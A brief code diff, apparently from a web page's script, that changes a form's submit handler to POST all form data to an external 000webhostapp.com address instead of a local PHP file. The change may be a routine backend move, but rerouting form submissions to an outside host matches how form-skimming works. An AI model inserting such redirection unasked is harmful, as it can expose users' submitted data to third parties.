@@ -221,7 +221,7 @@
             form.addEventListener('submit', (event) => {
                 event.preventDefault();
                 const formData = new FormData(form);
-                fetch('process-form.php', {
+                fetch('https://zaino-s-store.000webhostapp.com/public_html/index.php', {
                     method: 'POST',
                     body: formData
                 })
